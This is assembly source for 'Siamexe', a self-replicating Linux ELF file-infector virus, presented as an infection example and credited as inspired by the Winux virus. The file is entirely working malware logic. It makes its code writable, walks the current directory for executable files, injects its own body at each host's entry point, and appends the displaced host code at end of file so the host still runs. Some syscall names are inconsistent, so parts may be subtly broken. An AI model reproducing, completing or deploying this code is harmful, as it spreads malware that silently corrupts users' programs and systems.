   ;  _____                  ______       ___   ___
   ; /     \_  ______ __ __ /     /~|_ ___\_ \ /  /___
   ; |  _  /_]/  __  \  '  V  ___/  _/  __  \ '  /    \
   ; |  __/  |   ____/  |  |___  \  |   ____/   /  --  \
   ; |__| |__|\______/__|__|_____/__|\_____/\__/\______/
   ;
   ; This an example of an elf binary infection
   ; This technique is inspired of winux virus of Benny (great work)
   ;
   ;
   ; to Assemble it:
   ;   nasm -f elf Siamexe.asm
   ;   ld -o Siamexe Siamexe.o


   bits 32
   global _start

   section .text

       %define SYS_exit 1
       %define SYS_read 3
       %define SYS_write 4
       %define SYS_open 5
       %define SYS_close 6
       %define SYS_execve 11
       %define SYS_seek 19
       %define SYS_brk 45
       %define SYS_sethostname 74
       %define SYS_readdir 89
       %define SYS_mmap 90
       %define SYS_munmap 91
       %define SYS_lstat 107
       %define SYS_uname 109
       %define SYS_deprotect 125
       %define SYS_get_kernel_syms 130

   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; Some CODEZZ...                               ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   _start:
       push    eax
       pushad                      ; Restore all flags

       mov ebx, dword [esp+32+4+4] ; get argv[0]
           call    delta
       delta:
       pop ebp

       ; copy the virus body in the stack and exectute it
       mov ecx, end_of_host - begin_host
       sub esp, ecx
       lea esi, [ebp-delta+ begin_host]
       mov edi, esp
       rep movsb
       jmp esp

         begin_host:
       push    ebx
       lea ebx, [ebp-delta+_start]
       and ebx, 0FFFFF000h
       mov ecx, 3000h
       mov edx, 7
       mov eax, SYS_deprotect
       int 80h

       xor ecx, ecx    ; in mode 0
       pop ebx
       mov eax, SYS_open   ; open host file
       int 80h

       cmp eax,0xFFFFF000
       ja  fuck_

       call    dot
       db  '.',0
       dot:pop esi

       push    eax
       call    InfectDirectory
       pop ebx

         RestoreHostCode:
       xor edx, edx                            ; edx=0 seekset
       db  0b9h                                ; mov ecx, xxxxxxxx
       bytes2seek: dd  00000000h
       mov eax, SYS_lseek
       int 80h

       or  eax, eax
       jnz c_rc
       jmp dword[ebp-delta+first_generation]

         c_rc:
       lea ecx, [ebp-delta+_start]
       push    ecx
       pop esi
       mov edx, heap_end-_start
       mov eax, SYS_read
       int 80h

       mov eax, SYS_close
       int 80h

       add esp, end_of_host - begin_host   ; free virus memory
       mov dword [esp+32], esi     ; write entrypoint
       popad                               ; Restore all registers
       ret                 ; return to host

         fuck_:
       mov eax, SYS_exit
       int 80h
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; NAME   * InfectDirectory                                                 ;
   ; DESCR  * infect ze current directory                                     ;
   ;        *                                                                 ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; INPUT  * ESI = Directory to infect                                       ;
   ; OUTPUT *                                                                 ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   InfectDirectory:
       xor ecx, ecx
       mov ebx, esi
       mov eax, SYS_open ; open dir
       int 80h

       or  eax, eax
       jz  near fuck_infect

       push    eax
       pop dword [ebp-delta+ DirStream]

         loop_z:
       lea ecx, [ebp-delta+ dirent]
       mov ebx, dword [ebp-delta+ DirStream]
       mov eax, SYS_readdir
       int 80h

       or  eax, eax
       jz  fuck_infect

       add ecx, 0ah                            ; name of the file
       push    ecx
       pop esi

       xchg    ecx, ebx                            ; name of ze file
       lea ecx, [ebp-delta+stat]
       mov eax, SYS_lstat
       int 80h

       or  eax, eax
       jnz fuck_infect                         ; error ? fuck..

       movzx   eax, word [ecx+08h]     ; get st_mode of ze file
       push    eax
       pop ebx

       and ebx, 0000F000h
       cmp ebx, 00008000h          ; is it a regular file?
       jnz get_nxt                             ; if not find nxt

       and eax,00000040h
       or  eax, eax                            ; is it a user executable file ?
       jz  get_nxt                             ; if not find nxt
         gotcha:
       call    InfectFile                          ; infect it!!
         get_nxt:
       jmp loop_z
         fuck_infect:
       ret

   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; NAME   * InfectFile                                                      ;
   ; DESCR  * infect an elf file                                              ;
   ;        *                                                                 ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; INPUT  * ESI = Name of ze file                                           ;
   ; OUTPUT *                                                                 ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   InfectFile:
       xor eax, eax
       cdq
       mov ecx, 2                           ; open ze file
       mov ebx, esi                         ; in rw mode
       mov eax, SYS_open
       int 80h

       cmp eax,0xFFFFF000
       ja  near open_fail

       push    eax
       pop dword [ebp-delta+FileHandle]

       mov edx, 2                              ; SEEK to ze end = 2
       xor ecx,ecx                             ; offset 0
       xchg    eax, ebx                            ;file handle
       mov eax, SYS_lseek
       int 80h

       xchg    eax, ecx                            ; sizeof file
       mov dword [ebp-delta+bytes2seek], ecx
       mov ebx, dword [ebp-delta+ FileHandle]
       call    MapFile

       inc eax
       jz  near mmap_fail
       dec eax

       push    eax
       push    eax
       pop dword [ebp-delta+MapAdress]
       pop esi

       ;begin infection
         begin_infection:
       mov eax, dword[esi]
       add eax, -464C457Fh
       jne near unmap_spce         ; shit ! not a valid elf

       movzx   eax, word [esi+28h]     ; get elf header size
       mov ebx, dword [esi+18h]        ; get entry_point
       movzx   ecx, word [esi+2ch]     ; get ph number
       movzx   edx, word [esi+2ah]     ; get ph entry size

       push    esi
       pop edi                                 ; set edi to beginning of
       add edi, eax                            ; program header table
         nxt_phdr:
       mov eax, dword[edi+0ch]
       add eax, dword[edi+14h]
       cmp ebx, eax
       jb  got_phdr
       add edi, edx
       loop    nxt_phdr

       jmp unmap_spce                          ; there is no valid ph !

         got_phdr:
       mov esi, dword[esi+18h]     ; get EIP
       sub esi, dword[edi+08h]     ; get offsetsegment file offset
       push    esi                                 ; save offset from beginnig of psegment
       pop ebx                                 ; in ebx
       add esi, dword[ebp-delta+MapAdress] ; goto EIP in map

       mov eax, dword[ebp-delta+_start]
       cmp dword[esi], eax
       jz  unmap_spce                          ;already infected

       mov eax, dword[edi+14h]         ; get segment size
       sub eax, ebx
       cmp eax, heap_end-_start
       jb  unmap_spce                          ; sgm too small

       sub esp, heap_end-_start        ; create a stack frame
       mov ebx, esi
       mov ecx, heap_end-_start
       mov edi, esp
       rep movsb                               ; write host code there!

       xchg    ebx, edi
       lea esi, [ebp-delta+_start]
       mov ecx, heap_end-_start
       rep movsb                               ; inject dna!

       mov ecx,dword [ebp-delta+MapSize]
       mov ebx,dword [ebp-delta+MapAdress]
       mov eax, SYS_munmap
       int 80h                                 ; unmap file

       mov edx, heap_end-_start
       mov ecx, esp
       mov ebx, dword [ebp-delta+FileHandle]
           mov eax, SYS_write
       int 80h                                 ; write host cod at EOF

       add esp, heap_end-_start
       jmp mmap_fail
         unmap_spce:
       mov ecx,dword [ebp-delta+MapSize]
       mov ebx,dword [ebp-delta+MapAdress]
       mov eax, SYS_munmap
       int 80h                                 ; unmap file

         mmap_fail:
       mov ebx, dword [ebp-delta+FileHandle]
       mov eax,SYS_close
       int 80h                                 ; close file

         open_fail:
       ret
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; NAME   * MapFile                                                         ;
   ; DESCR  * Map ze specified file in memory                                 ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; INPUT  * EBX = handle of ze file                                         ;
   ;    * ECX = size to map                                                   ;
   ; OUTPUT * EAX = adr of the memory map                                     ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   MapFile:
       lea esi, [ebp-delta+ mmap_arg]  ; get mmap struct
       mov dword [esi+ 04h], ecx       ; set map size
       mov dword [esi+ 10h], ebx       ; set file handle

       xchg    ebx, esi
       mov eax,SYS_mmap
       int 80h                                 ; eax hold MapAdr

       cmp eax,0xFFFFF000
       jbe no_map_pb
       xor eax, eax
       dec eax
         no_map_pb:
       ret

   end_of_host:

   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; Some DATAZZ...                               ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;

           db "[hAckniX <@))>< PienSteVo]"
   end_of_start:

   heap_start:

   DirStream       dd      00000000h; ptr on the DIR struct
   FileHandle      dd      00000000h
   MapHandle       dd      00000000h
   MapAdress       dd      00000000h
   MapSize         dd      00000000h
   FileSize        dd      00000000h
   HostFileName        dd      00000000h;ptr on the host filename string

   ; space for stat struct
   stat:
       dw      0000h           ;st_dev
       dw      0000h           ;__pad1
       dd      00000000h       ;st_ino
       dw      0000h           ;st_mode
       dw      0000h           ;st_nlink
       dw      0000h           ;st_uid
       dw      0000h           ;st_gid
       dw      0000h           ;st_rdev
       dw      0000h           ;__pad2
       dd      00000000h       ;st_size
       dd      00000000h       ;st_blksize
       dd      00000000h       ;st_blocks
       dd      00000000h       ;st_atime
       dd      00000000h       ;__unused1
       dd      00000000h       ;st_mtime
       dd      00000000h       ;__unused2
       dd      00000000h       ;st_ctime
       dd      00000000h       ;__unused3
       dd      00000000h       ;__unused4
       dd      00000000h       ;__unused5

   dirent: ;ze dirent struct
       dd      00000000h       ; d_ino
       dd      00000000h       ; d_off
       dw      0000h           ; d_reclen
       times 256 db    00h         ; d_name[256]

   mmap_arg:
       dd      00000000h       ; addr   => no specified adr
       dd      00000000h       ; len
       dd      00000003h       ; prot   => RW attributes
       dd      00000001h       ; flags  => MAP_PRIVATE
       dd      00000000h       ; fd
       dd      00000000h       ; offset => offset null

   heap_end:

   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; First generation                                   ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   first_msg   db  "this is Siamexe first generation stub!", 0ah, 0
   first_msg_len   dd  $ - first_msg

   first_generation    dd  $+4
       mov edx, dword [ebp-delta+first_msg_len]
       lea ecx, [ebp-delta+first_msg]
       mov ebx, 01;stdout
       mov eax,4;write
       int 80h

       mov eax,1;exit
       int 80h
